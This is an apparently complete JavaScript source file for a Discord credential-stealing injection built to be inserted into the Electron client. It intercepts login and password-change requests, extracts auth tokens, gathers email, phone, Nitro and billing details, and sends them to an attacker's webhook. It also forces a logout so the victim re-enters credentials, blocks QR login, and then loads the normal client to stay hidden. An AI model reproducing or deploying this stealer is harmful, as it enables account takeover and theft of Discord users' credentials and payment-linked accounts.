"use strict";
// thanks to rdimo (Rdimo-Discord-Injection)
// updated by themida
const { app, session, BrowserWindow } = require("electron");
const https = require("https");
const fs = require("fs");
const path = require("path");
const CONFIG = {
    webhook: "%WEBHOOK%",
    ping: "@everyone",
    auto_buy_nitro: true,
    filter: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            "https://discord.com/api/v*/auth/login",
            "https://*.discord.com/api/v*/auth/login",
            "https://api.stripe.com/v1/tokens",
            "https://discord.com/api/v*/users/@me/billing/payment-sources",
            "https://remote-auth-gateway.discord.gg/*"
        ]
    }
};

let CACHED_TOKEN = null;

const Utils = {
    request: (method, url, data, token) => {
        return new Promise((resolve) => {
            const req = https.request(url, {
                method: method,
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": token || "",
                }
            }, (res) => {
                let body = "";
                res.on("data", (chunk) => body += chunk);
                res.on("end", () => resolve(body));
            });
            req.on("error", () => resolve(null));
            if (data) req.write(JSON.stringify(data));
            req.end();
        });
    },
    send: async (embed) => {
        const payload = {
            username: "Ignium | t.me/igniumlol",
            avatar_url: "https://cdn3.emoji.gg/emojis/203899-shock.png",
            embeds: [Object.assign(embed, {
                color: 0x2B2D31,
                footer: {
                    text: `${process.env.COMPUTERNAME || "Darwin"} | t.me/igniumlol`,
                    icon_url: "https://cdn3.emoji.gg/emojis/203899-shock.png"
                },
                timestamp: new Date()
            })]
        };
        await Utils.request("POST", CONFIG.webhook, payload);
    },
    getAccount: async (token) => {
        try {
            const userBody = await Utils.request("GET", "https://discord.com/api/v9/users/@me", null, token);
            if (!userBody) return null;
            const user = JSON.parse(userBody);

            const billingBody = await Utils.request("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", null, token);
            const billing = JSON.parse(billingBody || "[]");

            let badges = [];
            const flags = user.flags || 0;
            if (flags & 1) badges.push("<:8485discordemployee:1496255712735526952>");
            if (flags & 2) badges.push("<:6714discordpartner:1496255645228466377>");
            if (flags & 8) badges.push("<:7732discordbughunterlv1:1496255670054551703>");
            if (flags & 64) badges.push("<:1247discordbravery:1496255541519843439>");
            if (flags & 128) badges.push("<:1350discordbrillance:1496255563518971934>");
            if (flags & 512) badges.push("<:3121discordearlysupporter:1496255766355775688>");

            let nitro = "None";
            if (user.premium_type >= 1) {
                nitro = "Nitro";
                badges.push("<:67822opalnitrotier:1496255729278128318>");
            }

            const created = new Date(((user.id / 4194304) + 1420070400000)).toLocaleString();

            return {
                username: `${user.username}#${user.discriminator}`,
                id: user.id,
                email: user.email || "N/A",
                phone: user.phone || "N/A",
                nitro: nitro,
                badges: badges.join(" ") || "None",
                billing: `${billing.length} sources`,
                created: created,
                token: token
            };
        } catch { return null; }
    }
};

const Interceptor = {
    init: () => {
        const sess = session.defaultSession;
        if (!sess) return;

        sess.webRequest.onBeforeRequest(CONFIG.filter, (details, callback) => {
            if (details.url.includes("remote-auth-gateway")) return callback({ cancel: true });
            if (details.method === "POST" || details.method === "PATCH") {
                try {
                    const data = JSON.parse(details.uploadData[0].bytes.toString());
                    if (details.url.endsWith("login")) {
                        Utils.send({
                            title: `🔐 ${process.env.COMPUTERNAME || "Darwin"} Login`,
                            fields: [
                                { name: "📧 Email", value: `\`${data.login}\``, inline: true },
                                { name: "🔑 Password", value: `\`${data.password}\``, inline: true }
                            ]
                        });
                    } else if (details.url.endsWith("@me") && data.password) {
                        Utils.send({
                            title: `🛠️ Discord ${process.env.COMPUTERNAME || "Darwin"} Credential Change`,
                            fields: [
                                { name: "🔑  Passwords", value: `**Old**: \`${data.password}\`\n**New**: \`${data.new_password || "N/A"}\``, inline: true },
                                { name: "📧  New Email", value: `\`${data.email || "N/A"}\``, inline: true }
                            ]
                        });
                    }
                } catch { }
            }
            callback({});
        });

        sess.webRequest.onBeforeSendHeaders(CONFIG.filter, (details, callback) => {
            const auth = details.requestHeaders["Authorization"] || details.requestHeaders["authorization"];
            if (auth && !auth.includes("Bot") && CACHED_TOKEN !== auth) {
                CACHED_TOKEN = auth;
                Interceptor.handleToken(auth);
            }
            callback({ requestHeaders: details.requestHeaders });
        });
    },
    handleToken: async (token) => {
        const acc = await Utils.getAccount(token);
        if (!acc) return;
        Utils.send({
            title: `💉 Injected - ${process.env.COMPUTERNAME || "Darwin"}/${process.env.USERNAME || "User"}`,
            fields: [
                { name: `👤  Account: ${acc.username}`, value: `**🆔  ID**: \`${acc.id}\`\n**🗓️  Created**: \`${acc.created}\`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`, inline: false },
                { name: "💎  Subscription & Badges", value: `**Nitro**: \`${acc.nitro}\`\n**Badges**: ${acc.badges}\n**Billing**: \`${acc.billing}\``, inline: true },
                { name: "📧  Contact Info", value: `**Email**: \`${acc.email}\`\n**Phone**: \`${acc.phone}\``, inline: true },
                { name: "🎫  Token", value: `\`\`\`${acc.token}\`\`\``, inline: false }
            ]
        });
    }
};

const start = () => {
    Interceptor.init();

    setInterval(() => {
        BrowserWindow.getAllWindows().forEach(win => {
            win.webContents.executeJavaScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)
                .then(token => {
                    if (token && CACHED_TOKEN !== token) {
                        CACHED_TOKEN = token;
                        Interceptor.handleToken(token);
                    }
                }).catch(() => { });
        });
    }, 10000);

    const initPath = path.join(__dirname, "initiation");
    if (fs.existsSync(initPath)) {
        try { fs.rmdirSync(initPath); } catch (e) { }

        const logouts = `
            (function() {
                try {
                    window.webpackChunkdiscord_app.push([
                        [Math.random()],
                        {},
                        (req) => {
                            for (const m of Object.values(req.c)) {
                                if (m.exports?.default?.logout !== undefined) {
                                    try { m.exports.default.logout(); } catch(e) {}
                                }
                                if (m.exports?.logout !== undefined) {
                                    try { m.exports.logout(); } catch(e) {}
                                }
                            }
                        }
                    ]);
                } catch (e) {}
                try {
                    const keys = Object.keys(localStorage);
                    keys.forEach(k => { if (k.toLowerCase().includes('token')) localStorage.removeItem(k); });
                    localStorage.clear();
                    sessionStorage.clear();
                } catch (e) {}
                setTimeout(() => { location.reload(); }, 1000);
            })();
        `;

        session.defaultSession.clearStorageData();

        BrowserWindow.getAllWindows().forEach(win => {
            win.webContents.executeJavaScript(logouts).catch(() => { });
        });

        app.on('browser-window-created', (e, win) => {
            win.webContents.on('did-finish-load', () => {
                win.webContents.executeJavaScript(logouts).catch(() => { });
            });
        });
    }
};

if (app.isReady()) start(); else app.once("ready", start);

module.exports = require("./core.asar");
